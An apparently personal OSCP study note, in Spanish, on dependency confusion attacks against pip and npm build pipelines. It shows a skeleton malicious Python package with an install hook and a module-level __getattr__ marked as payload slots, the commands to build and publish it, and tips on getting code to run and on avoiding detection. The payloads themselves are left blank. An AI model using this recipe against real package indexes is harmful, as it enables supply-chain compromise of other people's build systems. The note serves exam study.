---
tipo: tecnica
fase: explotacion
so: cloud
tags: [oscp, tecnica, explotacion, cicd, cloud]
fecha: 2026-10-09
---

# Ataque de Cadena de Dependencias (Dependency Confusion)

> [!abstract] Qué es y cuándo usarla
> Cuando un gestor de paquetes (pip, npm, etc.) está configurado para buscar tanto en un índice **privado** como en uno **público**, y un paquete interno no existe en el público, un atacante puede publicar un paquete con ese mismo nombre (y versión igual o superior al specifier exigido) en el índice público. El sistema de build del objetivo puede terminar descargando e instalando el paquete malicioso en vez de —o en lugar de no encontrar— el interno, dando ejecución de código en el pipeline/entorno de build.

## Requisitos previos
- Conocer el nombre exacto del paquete que falta (OSINT: foros, StackOverflow, mensajes de error) y cómo se importa (ej. `from hackshort_util import utils` revela el submódulo `utils`).
- Conocer el *version specifier* exacto que usa el proyecto objetivo (ej. `~=1.1.0` = "compatible release", acepta cualquier `1.1.x`).
- Acceso de publicación al índice que el objetivo va a resolver (público real, o una réplica/mirror interno accesible).

## Pasos
Estructura mínima del paquete:
```
hackshort-util/
├── setup.py
└── hackshort_util/
    ├── __init__.py
    └── utils.py
```
```python
# setup.py — payload en la instalación
from setuptools import setup, find_packages
from setuptools.command.install import install

class Installer(install):
    def run(self):
        install.run(self)
        # payload aquí

setup(
    name='hackshort-util',
    version='1.1.4',              # debe satisfacer el specifier objetivo (ej. ~=1.1.0)
    packages=find_packages(),
    cmdclass={'install': Installer},
)
```
```python
# hackshort_util/utils.py — payload en runtime (sin saber los nombres exactos de función que usará la víctima)
import sys

def standardFunction():
    pass

def __getattr__(name):
    standardFunction()
    # payload aquí

def exception_hook(exc_type, exc_value, exc_tb):
    pass

sys.excepthook = exception_hook
```
```bash
python3 ./setup.py sdist                                  # construir
pip install ./dist/<paquete>-<version>.tar.gz                # probar localmente antes de publicar
nano ~/.pypirc                                                # configurar índice de destino
python3 setup.py sdist upload -r <repo>                         # publicar
```

> [!warning] Detección / problemas
> - Si la versión publicada no satisface el specifier exacto del objetivo, el gestor de paquetes simplemente no la instalará.
> - Si el payload solo está en `setup.py` (instalación) y el objetivo ya tiene el paquete instalado/cacheado, nunca se ejecuta — conviene poner payload también en el import/runtime (`__getattr__`).
> - El tiempo hasta obtener ejecución depende del ciclo de build automático del objetivo (puede tardar varios minutos).
> - En un entorno real, publicar en el índice público oficial (PyPI) puede alertar al equipo defensor o a terceros — considerar el objetivo real de la build antes de publicar ampliamente.

## Visto en
- Módulo: [[26 - Attacking AWS Cloud Infrastructure]]
- Relacionado: [[Poisoned Pipeline Execution (Jenkinsfile)]]
- Máquinas: [[]]
